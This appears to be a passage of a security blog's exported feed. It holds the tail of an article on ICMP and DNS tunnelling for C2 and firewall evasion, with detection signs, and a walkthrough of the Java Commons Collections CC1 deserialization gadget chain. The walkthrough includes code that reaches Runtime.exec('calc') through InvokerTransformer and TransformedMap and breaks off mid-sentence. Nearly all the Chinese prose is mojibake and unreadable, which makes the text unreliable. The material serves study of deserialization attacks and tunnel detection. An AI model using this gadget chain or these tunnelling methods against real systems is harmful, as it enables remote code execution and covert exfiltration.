æ¯ç§’æœ€å¤šåªä¼šå‘é€ä¸¤ä¸ªæ•°æ®åŒ…ï¼Œè€Œä½¿ç”¨ ICMPéš§é“çš„æµè§ˆå™¨åœ¨åŒä¸€æ—¶é—´ä¼šäº§ç”Ÿä¸Šåƒä¸ª ICMP æ•°æ®åŒ…ã€‚</p></li><li><p>å¯»æ‰¾é‚£äº›å“åº”æ•°æ®åŒ…ä¸­ payload è·Ÿè¯·æ±‚æ•°æ®åŒ…ä¸ä¸€è‡´çš„ ICMP æ•°æ®åŒ…ã€‚</p></li><li><p>æ³¨æ„é‚£äº› ICMP æ•°æ®åŒ…ä¸­ payload å¤§äº 64 æ¯”ç‰¹çš„æ•°æ®åŒ…ã€‚å½“ç„¶ icmptunnel å¯ä»¥é…ç½®é™åˆ¶æ‰€æœ‰æ•°æ®åŒ…çš„ payload ä¸º 64 æ¯”ç‰¹ï¼Œè¿™æ ·ä¼šä½¿å¾—æ›´éš¾ä»¥è¢«æ£€æµ‹åˆ°ã€‚</p></li><li><p>æ£€æŸ¥ICMPæ•°æ®åŒ…çš„åè®®æ ‡ç­¾ï¼Œä¾‹å¦‚icmptunnel ä¼šåœ¨æ‰€æœ‰çš„ ICMPpayload å‰é¢å¢åŠ  â€˜TUNLâ€™ æ ‡è®°ä»¥ç”¨äºè¯†åˆ«éš§é“ï¼Œè¿™å°±æ˜¯ç‰¹å¾ã€‚</p></li></ul><h1 id="å…è®¸ç‰¹å®šçš„TCPæˆ–UDPåè®®ç«¯å£å‡ºç½‘"><a href="#å…è®¸ç‰¹å®šçš„TCPæˆ–UDPåè®®ç«¯å£å‡ºç½‘" class="headerlink" title="å…è®¸ç‰¹å®šçš„TCPæˆ–UDPåè®®ç«¯å£å‡ºç½‘"></a>å…è®¸ç‰¹å®šçš„TCPæˆ–UDPåè®®ç«¯å£å‡ºç½‘</h1><p>ç»œé˜²ç«å¢™å…è®¸ç‰¹å®šçš„TCPæˆ–è€…UDPç«¯å£å‡ºç½‘ï¼Œæ¯”å¦‚è¿æ¥å¤–ç½‘çš„22ã€53ã€80ã€443ã€3389ç­‰å¸¸è§åº”ç”¨çš„é»˜è®¤ç›‘å¬ç«¯å£ã€‚</p><p>åœ¨ä¸€ä¸ªä¸èƒ½å‡ºç½‘çš„ç½‘ç»œç¯å¢ƒé‡Œé¢ï¼Œå°†æ‰€æœ‰çš„TCPå’ŒUPDç«¯å£éƒ½æ¢æµ‹ä¸€éï¼Œé€šå¸¸éƒ½èƒ½å‘ç°æœ‰ä¸€ä¸¤ä¸ªå¸¸è§çš„ç«¯å£èƒ½å‡ºç½‘ã€‚è¿™é€šå¸¸æ˜¯ç”±äºç½‘ç»œç®¡ç†å‘˜çš„é”™è¯¯é…ç½®å’Œå·æ‡’è¡Œä¸ºå¯¼è‡´ï¼š</p><p>æ¯”å¦‚é…ç½®çš„é˜²ç«å¢™è§„åˆ™å‰åçŸ›ç›¾ï¼Œè§£æçš„æ—¶å€™é‡åˆ°åŒ¹é…è§„åˆ™å°±é€€å‡ºæ‰§è¡Œ<br>æ¯”å¦‚ç½‘ç»œç®¡ç†å‘˜é…ç½®å…è®¸webæœåŠ¡å™¨è®¿é—®å¦ä¸€å­ç½‘çš„mysqlæ•°æ®åº“çš„3306ç«¯å£ã€‚ç½‘ç»œç®¡ç†å‘˜é…ç½®æ—¶å·æ‡’ï¼Œå¯èƒ½ä¼šç›´æ¥æ”¾è¡ŒwebæœåŠ¡å™¨åˆ°ä»»æ„ipåœ°å€çš„3306ç«¯å£</p><h1 id="DNSéš§é“"><a href="#DNSéš§é“" class="headerlink" title="DNSéš§é“"></a>DNSéš§é“</h1><h5 id="å…è®¸ç‰¹å®šçš„åº”ç”¨å±‚åè®®å‡ºç½‘ï¼ˆæ¯”å¦‚HTTPã€SSHã€DNSç­‰åº”ç”¨å±‚åè®®ï¼‰"><a href="#å…è®¸ç‰¹å®šçš„åº”ç”¨å±‚åè®®å‡ºç½‘ï¼ˆæ¯”å¦‚HTTPã€SSHã€DNSç­‰åº”ç”¨å±‚åè®®ï¼‰" class="headerlink" title="å…è®¸ç‰¹å®šçš„åº”ç”¨å±‚åè®®å‡ºç½‘ï¼ˆæ¯”å¦‚HTTPã€SSHã€DNSç­‰åº”ç”¨å±‚åè®®ï¼‰"></a>å…è®¸ç‰¹å®šçš„åº”ç”¨å±‚åè®®å‡ºç½‘ï¼ˆæ¯”å¦‚HTTPã€SSHã€DNSç­‰åº”ç”¨å±‚åè®®ï¼‰</h5><p>è¿™ç§ç½‘ç»œé˜²ç«å¢™èƒ½è¯†åˆ«åº”ç”¨å±‚çš„åè®®ï¼Œæ”¾è¡Œå…è®¸å‡ºç½‘çš„åè®®ï¼Œæ¯”å¦‚HTTPã€SSHã€DNSã€RDPç­‰åº”ç”¨å±‚åè®®</p><p>åŸç†</p><p>ç«¯å£ä¸å’ŒæœåŠ¡ç»‘å®šï¼Œå¯ä»¥ä¼ è¾“ä»»ä½•æ•°æ®ã€‚</p><p>è¯¦ç»†èŠèŠè¿™æ®µæ–‡å­— ç«¯å£ä¸å’ŒæœåŠ¡ç»‘å®šæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œæ„æ€å°±æ˜¯DNSçš„53å·ç«¯å£å®ƒå¦‚æœåªèƒ½ä¼ é€’å¸¦æœ‰DNSå¤´çš„æ•°æ®åŒ…çš„æµé‡è¿™ä¸ªå°±å«åšç«¯å£å’ŒæœåŠ¡è¿›è¡Œç»‘å®šä½†æ˜¯DNSç«¯å£å¯ä»¥ä¼ è¾“æ–‡ä»¶ï¼ŒæŒ‡ä»¤ç”šè‡³å¯ä»¥ä¼ è¾“ç”µå½± è¿™ä¸ªæ„æ€å°±æ˜¯ç«¯å£å’ŒæœåŠ¡æ²¡æœ‰è¿›è¡Œç»‘å®š è¿™å°±é€ æˆäº†æˆ‘ä»¬å¯¹DNSéš§é“çš„ä¸€ä¸ªåˆ©ç”¨</p><p>C&amp;CæœåŠ¡å™¨åœ¨å»ºç«‹è¿æ¥åå°†æŒ‡ä»¤ä¼ é€’ç»™å®¢æˆ·ç«¯ä¸Šçš„åé—¨ç¨‹åºã€‚</p><p>å®¢æˆ·ç«¯åé—¨ç¨‹åºè¿›è¡ŒDNSæŸ¥è¯¢æ—¶ï¼Œå¦‚æœæŸ¥è¯¢çš„åŸŸåä¸åœ¨DNSæœåŠ¡å™¨æœ¬æœºçš„ç¼“å­˜ä¸­ï¼Œå°±ä¼šè®¿é—®äº’è”ç½‘è¿›è¡ŒæŸ¥è¯¢ï¼Œç„¶åè¿”å›ç»“æœï¼Œå¦‚æœäº’è”ç½‘ä¸Šæœ‰ä¸€å°æ”»å‡»è€…è®¾ç½®çš„æœåŠ¡å™¨ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±å¯ä»¥ä¾é åŸŸåè§£æçš„å“åº”è¿›è¡Œæ•°æ®åŒ…çš„äº¤æ¢ï¼Œä»DNSåè®®çš„è§’åº¦æ¥çœ‹ï¼Œè¿™æ ·çš„æ“ä½œåªæ˜¯åå¤æŸ¥è¯¢æŸä¸ªæˆ–è€…æŸäº›ç‰¹å®šçš„åŸŸåå¹¶ä¸”å¾—åˆ°è§£æç»“æœï¼Œä½†å…¶æœ¬è´¨æ˜¯ï¼ŒDNSé¢„æœŸçš„è¿”å›ç»“æœåº”è¯¥æ˜¯ä¸€ä¸ªIPåœ°å€ï¼Œè€Œäº‹å®ä¸Šè¿”å›çš„å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬åŠ å¯†çš„C&amp;CæŒ‡ä»¤ï¼Œä»è€Œå°†å…¶ä»–åè®®å°è£…åœ¨DNSåè®®ä¸­è¿›è¡Œä¼ è¾“ã€‚<br>DNSéš§é“ï¼ˆç›´è”å‹ï¼‰æœ¨é©¬çš„é€šä¿¡ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/c35866a915140c30a95b310e6f3fe54.png"></p><p>ç›´è¿ä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯ç›´æ¥å’ŒæŒ‡å®šçš„ç›®æ ‡DNS Server(Authoritative NS Server)è¿æ¥ï¼Œé€šè¿‡å°†æ•°æ®ç¼–ç å°è£…åœ¨DNSåè®®ä¸­è¿›è¡Œé€šä¿¡ï¼Œè¿™ç§æ–¹å¼é€Ÿåº¦æ›´å¿«ï¼Œä½†æ˜¯éšè”½æ€§è¾ƒå·®ï¼Œå®¹æ˜“è¢«WAFæˆ–è€…IDSè®¾å¤‡æ¢æµ‹åˆ°ï¼Œå¦å¤–é™åˆ¶æ¯”è¾ƒé«˜ï¼Œå¾ˆå¤šå®é™…åœºæ™¯ä¸‹ä¸å…è®¸æ”»å‡»è€…æ¥è‡ªå®šä¹‰DNS Serverï¼Œå¦åˆ™å¾ˆå®¹æ˜“è¢«å‘ç°ã€‚</p><p>åä¸­ç»§å‹ï¼š</p><p>é€šè¿‡DNSé€’å½’æŸ¥è¯¢å®ç°çš„ä¸­ç»§éš§é“ï¼Œæ¯”è¾ƒéšè”½ï¼Œä½†åŒæ—¶å› ä¸ºæ•°æ®åŒ…åˆ°è¾¾ç›®æ ‡DNS Serverå‰éœ€è¦ç»è¿‡å¤šä¸ªèŠ‚ç‚¹ï¼Œæ‰€ä»¥é€Ÿåº¦ä¸Šè¾ƒç›´è¿æ…¢å¾ˆå¤š(å…¶å®å°±ç±»ä¼¼ä¼ªé€ ä¸€å°ç§æœ‰DNS Serverï¼Œå½“ç„¶ä¹Ÿè®¸å¤§ä½¬ç¥ä»™ä»¬çœŸæœ‰ä¸€å°æƒå¨DNS Serverä¹Ÿè¯´ä¸ä¸€å®šå“ˆ)ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜éœ€è¦è§„é¿æœ¬åœ°å®¢æˆ·ç«¯çš„DNSç¼“å­˜ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨éšæœºåŸŸåç”Ÿæˆç®—æ³•ï¼ˆDGAï¼‰ã€‚å¾ˆå¤šæ¶æ„è½¯ä»¶åˆ©ç”¨è¯¥ç®—æ³•ç”ŸæˆéšæœºåŸŸåï¼Œæœ‰æ•ˆç»•è¿‡é»‘åå•æ£€æµ‹ï¼Œé€šè¿‡è½®è¯¢çš„æ–¹å¼å°è¯•è¿æ¥ï¼Œå¯»æ‰¾C2æ§åˆ¶ä¸­å¿ƒã€‚ï¼ˆDGAç®—æ³•çš„æ£€æµ‹æµ‹æ–¹æ³•ä¹Ÿæœ‰ä¸å°‘ï¼Œè¿™é‡ŒæŒ‰ä¸‹ä¸è¡¨ï¼‰<br><img src="C:\Users\GuoFen\AppData\Roaming\Typora\typora-user-images\image-20250321154330405.png" alt="image-20250321154330405"></p><p>â‘ å—åˆ°æœ¨é©¬æ§åˆ¶çš„PCå°†æ•°æ®å°è£…åˆ°DNSæ•°æ®æŠ¥æ–‡é‡Œï¼Œå‘ä½äºå†…ç½‘çš„æœ¬åœ°åŸŸåæœåŠ¡å™¨è¯·æ±‚æŸ¥è¯¢baidu.com</p><p>â‘¡æœ¬åœ°åŸŸåæœåŠ¡å™¨é€è¿‡é˜²ç«å¢™å‘æ ¹åŸŸåæœåŠ¡å™¨å‘é€æŸ¥è¯¢è¯·æ±‚</p><p>â‘¢ç»è¿‡å¤§é‡çš„é€’å½’é‡å®šå‘ï¼ŒæŸ¥è¯¢è¯·æ±‚å‘åˆ°baidu.comçš„ï¼ˆä¼ªé€ ï¼‰æƒå¨åŸŸåæœåŠ¡å™¨</p><p>â‘£baidu.comï¼ˆä¼ªé€ ï¼‰æƒå¨åŸŸåæœåŠ¡å™¨æ˜¯åœ¨æ”»å‡»è€…æ§åˆ¶ä¸‹ï¼Œè§£æå¹¶å‘é€å“åº”åŒ…</p><p>â‘¤dnså“åº”åŒ…ç©¿é€å†…ç½‘é˜²ç«å¢™</p><p>â‘¥è¿›å…¥å†…ç½‘</p><p>â‘¦æœ¬åœ°åŸŸåæœåŠ¡å™¨å°†å“åº”åŒ…è¿”å›ç»™å—æ§å®¢æˆ·ç«¯æ£€æµ‹ï¼š</p><p>ç¼ºç‚¹ï¼š</p><ul><li><strong>é€Ÿåº¦æ…¢</strong>ï¼šDNSæŸ¥è¯¢éœ€è¦æ¥å›å¤šæ¬¡ï¼Œä¼ å¤§æ–‡ä»¶ä¼šæ€¥æ­»äººã€‚</li><li><strong>å¯èƒ½è¢«æ£€æµ‹</strong>ï¼šé˜²ç«å¢™å‘ç°å¤§é‡å¼‚å¸¸DNSè¯·æ±‚ä¼šæŠ¥è­¦ã€‚</li><li><strong>éœ€è¦è‡ªå»ºNSæœåŠ¡å™¨</strong>ï¼šå¾—æœ‰ä¸ªæœåŠ¡å™¨éšæ—¶å¾…å‘½å¤„ç†æŸ¥è¯¢ã€‚</li></ul><h3 id="æ£€æµ‹-1"><a href="#æ£€æµ‹-1" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h3><ul><li>æ¯ä¸ªIPåœ°å€çš„DNSæµé‡å¼‚å¸¸ï¼ŒDNSæŠ¥æ–‡æ•°é‡å¤§</li><li>DNSæ¶ˆæ¯ä¸­TXTæˆ–NULLç­‰ä¸å¸¸ç”¨çš„è®°å½•ç±»å‹å¤š</li><li>DNSæ¶ˆæ¯ä¸­åŸŸåæœ‰éƒ¨åˆ†å›ºå®šä¸å˜</li><li>DNSæœåŠ¡å™¨çš„åœ°ç†ä½ç½®å¼‚å¸¸</li><li>è®¿é—®éå—ä¿¡çš„DNSæœåŠ¡å™¨</li><li>åŸºäºè¯·æ±‚åŸŸåé•¿åº¦åŠè¯·æ±‚é¢‘ç‡ç»Ÿè®¡åˆ†ææ–¹æ³•</li><li>dnscat æŸ¥è¯¢ä¸­åŒ…å«äº†dnscat å­—ç¬¦ä¸²</li></ul>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cc1åˆ†æ</title>
      <link href="/2025/03/19/cc1%E5%88%86%E6%9E%90/"/>
      <url>/2025/03/19/cc1%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>â€‹    </p><p>ç¯å¢ƒæ­å»ºä¸è¯´äº† ç½‘ä¸Šå¾ˆå¤šä¼˜ç§€çš„æ–‡ç« æ•™å­¦</p><p>å…ˆåˆ—å‡ºåˆ©ç”¨çš„é“¾å­ç„¶åæˆ‘ä»¬éœ€è¦å€’ç€è¿›è¡Œåˆ†æ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()--&gt;</span><br><span class="line">AbstractInputCheckedMapDecorator.MapEntry.setValue()--&gt;</span><br><span class="line">TransformedMap.checkSetValue()--&gt;</span><br><span class="line">ChainedTransformer.transform()--&gt;</span><br><span class="line">InvokerTransformer.transform()</span><br></pre></td></tr></table></figure><p>CC1é“¾çš„<strong>æœ«å°¾</strong>ï¼ˆå…¥å£&#x2F;æºå¤´ï¼‰å°±æ˜¯Commons Collectionsåº“ä¸­çš„<code>Tranformer</code>æ¥å£ï¼Œè¿™ä¸ªæ¥å£é‡Œé¢æœ‰ä¸ª<code>transform</code>æ–¹æ³•ã€‚</p><p><strong>InvokerTransformer</strong></p><p>æ‰¾åˆ°è¿™ä¸ªç±»å‘ç°å®ç°äº†Tranformeræ¥å£çš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;<span class="comment">//å®šä¹‰äº†ä¸€ä¸ªè¿”å›ç±»å‹æ˜¯objectçš„å…¬å…±æ–¹æ³•ä¸”æ¥å—çš„å‚æ•°æ˜¯ä¸€ä¸ªinputçš„Object</span></span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;<span class="comment">//æ£€æŸ¥ä¼ å…¥çš„å‚æ•°æ˜¯å¦ä¸ºnull,ä¸ºnullç›´æ¥è¿”å›null</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//åå°„è·å– input å¯¹è±¡çš„ Class å¯¹è±¡ã€‚</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);<span class="comment">//ä» cls è¡¨ç¤ºçš„ç±»ä¸­æŸ¥æ‰¾ä¸€ä¸ªå…¬å…±æ–¹æ³•ï¼Œå¹¶è¿”å›å¯¹åº”çš„ Method å¯¹è±¡ã€‚</span></span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);<span class="comment">//è°ƒç”¨ method è¡¨ç¤ºçš„æ–¹æ³•ï¼Œå¹¶è¿”å›å…¶ç»“æœ</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™æ®µä»£ç  ä»£ç ä¸å¥½å»ºè®®é€å¥åˆ†æè¿™é‡Œç›´æ¥æ”¾åˆ°æ³¨é‡Šé‡Œé¢</p><p>è¿™å°±å®Œå…¨ç¬¦åˆååºåˆ—åŒ–çš„å‚æ•°å¯æ§å¯ä»¥ç›´æ¥è¿›è¡Œåˆ©ç”¨ï¼Œå‚æ•°å¯æ§å°±å¯¼è‡´äº†<strong>åå°„è°ƒç”¨ä»»æ„ç±» ä»»æ„æ–¹æ³•</strong>ã€‚</p><p>è¿›è¡Œåˆ©ç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="comment">//æ­£å¸¸ è°ƒç”¨å¯å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•</span></span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">cmd</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="comment">//ä½¿ç”¨åå°„ è°ƒç”¨å¯å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•</span></span><br><span class="line">        <span class="comment">//Class clazz = Runtime.class;</span></span><br><span class="line">        <span class="comment">//Method cmdMethod = clazz.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="comment">//cmdMethod.invoke(cmd, &quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//InvokerTransformerç±» è°ƒç”¨å¯å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(cmd);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(cmd);<span class="comment">//ç»™InvokerTransformeré‡Œçš„å‚æ•°èµ‹å€¼ï¼Œç„¶åè°ƒç”¨transformï¼ˆcmdï¼‰ï¼Œæœ€ç»ˆå®ä¹ åœ¨cmdä¸Šå®ç°Runtime.getRuntime().exec(&quot;calc&quot;)</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250319202058.png"></p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>çŸ¥é“äº†<code>InvokerTransformer</code>ç±»å¯ä»¥è°ƒç”¨<code>transform()</code>æ–¹æ³•æ‰§è¡Œå‘½ä»¤ï¼Œé‚£æ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯å¯»æ‰¾è¿˜æœ‰å…¶ä»–ä»€ä¹ˆåœ°æ–¹è°ƒç”¨äº†<code>InvokerTransformer</code>ç±»çš„<code>transform()</code>æ–¹æ³•ã€‚</p><p>å¯ä»¥çœ‹åˆ°åœ¨TransformedMapè¿™ä¸ªç±»ä¸‹é¢çš„checkSetValueæ–¹æ³•è°ƒç”¨äº†ä»valueTransformer.transform</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250320133956.png"></p><p>å¾€ä¸Šæ‰¾valueTransformer </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç° keyTransformerï¼ŒvalueTransformer å‚æ•°å¯æ§ ä½†æ˜¯æ˜¯protectedï¼Œåªèƒ½å†…éƒ¨ç±»è®¿é—®ï¼Œæƒé™ä¸å¤Ÿï¼Œå¾€ä¸Šæ‰¾ï¼ŒæŸ¥çœ‹æ˜¯è°å…·ä½“è°ƒç”¨äº†æ–¹æ³•checkSetValue()å†…éƒ¨çš„è¿™ä¸ªtransform()ï¼Œå‘ç°æ˜¯valueTransformerè¿›è¡Œè°ƒç”¨ï¼ŒæŸ¥çœ‹valueTransformerï¼Œå‘ç°valueTransformerä¹Ÿæ˜¯protectæƒé™ï¼Œç»§ç»­æŸ¥çœ‹valueTransformerä»å“ªé‡Œæ¥çš„ï¼Œæœ€åæˆ‘ä»¬å‘ç°decorate()è°ƒç”¨TransformedMap()çš„æ„é€ æ–¹æ³•æ¥çš„ï¼Œæ‰€æœ‰æ¶‰åŠåˆ°çš„æ–¹æ³•ï¼Œåªæœ‰decorateçš„æƒé™ä¿®é¥°ç¬¦æ˜¯public</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™ä¸ªdecorateç±»æˆ‘ä»¬å°±å¯ä»¥è¿›ä¸€æ­¥æ§åˆ¶valueTransformer</p><p>å…³é”®ï¼š<code>TransformedMap</code> æœ¬èº«ä¸å­˜å‚¨æ•°æ®ï¼Œè€Œæ˜¯å°†æ“ä½œå§”æ‰˜ç»™åŸå§‹ <code>HashMap</code>ï¼Œå¹¶åœ¨æ“ä½œå‰åè§¦å‘è½¬æ¢å™¨é€»è¾‘ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿™é‡Œç©¿æ’ä¸€ä¸‹TransformedMapè£…é¥°å™¨æœ¬äº‹å°±åƒæ˜¯ä¸€ä¸ªå¤–æŒ‚æ²¡æœ‰å®é™…ä½œç”¨éœ€è¦HashMapæ¥å­˜å‚¨é”®å€¼å¯¹ï¼Œéœ€è¦æŠ«æŒ‚åœ¨HashMapä¸Šæ‰èƒ½å‘æŒ¥ä½œç”¨</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯transformMapçš„æ–¹æ³•ï¼Œæ‰€ä»¥å…ˆå»æ„å»ºä¸€ä¸ªHashMapï¼Œå†é€šè¿‡è¿™ä¸ªmapæ¥è°ƒç”¨transformerå†…çš„decorate()æ¥å®Œæˆä¸€ä¸ªtransformedMapçš„å®ä¾‹åŒ–ï¼Œæœ€åå†æƒ³åŠæ³•è§¦å‘checkSetValue()æ–¹æ³•å³å¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r=Runtime.*getRuntime*();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(r);</span></span><br><span class="line"> HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); <span class="comment">//è¿™ä¸ªç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ªHashMap</span></span><br><span class="line"></span><br><span class="line"> Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer); </span><br><span class="line"><span class="comment">//é™æ€æ–¹æ³•staicä¿®é¥°ç›´æ¥ç±»åï¼‹æ–¹æ³•åè°ƒç”¨</span></span><br><span class="line"><span class="comment">//æŠŠmapå½“æˆå‚æ•°ä¼ å…¥ï¼Œç„¶åç¬¬äºŒä¸ªå‚æ•°æˆ‘ä»¬ç”¨ä¸ç€å°±èµ‹ç©ºå€¼null,ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬ä¹‹å‰çš„invokerTransformer.</span></span><br></pre></td></tr></table></figure><p><strong>å¯»æ‰¾è°ƒç”¨checkSetValue()çš„æ–¹æ³•</strong></p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250320142341.png"></p><p>å‘ç°AbstractlnputCheckedMapDecoratorç±»ç§çš„setValueæ–¹æ³•å¯ä»¥è¿›è¡Œå¯¹checkSetvalueçš„è°ƒç”¨é‚£ä¹ˆå°±</p><p><code>checkSetValue()</code>æ˜¯<code>TransformedMap</code>çš„å…³é”®æ–¹æ³•ï¼Œç”¨äºåœ¨å€¼è¢«ä¿®æ”¹æ—¶åº”ç”¨è½¬æ¢é€»è¾‘ã€‚å½“è°ƒç”¨ <code>Map.Entry.setValue()</code> ä¿®æ”¹æ¡ç›®å€¼æ—¶ï¼Œ<code>TransformedMap</code> çš„ <code>checkSetValue()</code> ä¼šè¢«è§¦å‘ï¼Œå¯¹å€¼è¿›è¡Œè½¬æ¢ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç©¿æ’ï¼šMapé‡Œå­˜å‚¨äº†é”®å€¼å¯¹,æ¯ä¸€ä¸ªé”®å€¼å¯¹è¢«javaå°è£…æˆä¸€ä¸ªEntryå¯¹è±¡ï¼Œå½“æƒ³ä¿®æ”¹é”®å€¼å¯¹çš„å€¼çš„æ—¶å€™å°±å¯ä»¥å¯ä»¥ç›´æ¥é€šè¿‡`Entry`çš„`setValue()`æ–¹æ³•è¿›è¡Œä¿®æ”¹ï¼Œè¿™é‡Œå› ä¸ºæœ‰è£…é¥°å™¨TransformedMapï¼Œè£…é¥°å™¨TransformedMapç›‘å¬å¯¹å€¼çš„ä¿®æ”¹æ“ä½œï¼Œå°±æ˜¯æ¯å½“æƒ³è°ƒç”¨**`setValue()`æ—¶ï¼Œå¤–æŒ‚ä¼šå…ˆè§¦å‘`checkSetValue()`æ–¹æ³•**ï¼Œå¯¹ä¿®æ”¹çš„å€¼åšé¢å¤–çš„å¤„ç†</span><br></pre></td></tr></table></figure><p>MapEntryç±»å®é™…ä¸Šæ˜¯é‡å†™çˆ¶ç±»AbstractMapEntryDecoratorçš„setValue()æ–¹æ³•</p><p>MapEntryçš„çˆ¶ç±»AbstractMapEntryDecoratoråˆå¼•å…¥äº†Map.Entryæ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¿›è¡Œå¸¸ç”¨çš„Mapéå†ï¼Œå°±å¯ä»¥è°ƒç”¨setValue()ï¼Œï¼Œç„¶åæ°´åˆ°æ¸ æˆçš„è°ƒç”¨checkSetValue()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è§£é‡Šä¸‹ä¸ºä»€ä¹ˆè¦éå†ï¼š`TransformedMap`çš„æœºåˆ¶**ï¼šå®ƒé€šè¿‡è£…é¥°`Map.Entry`å¯¹è±¡ï¼ˆæ¯ä¸ªçº¸æ¡ï¼‰æ¥ç›‘å¬ä¿®æ”¹æ“ä½œï¼Œç›´æ¥è°ƒç”¨`map.put(&quot;é”®&quot;, 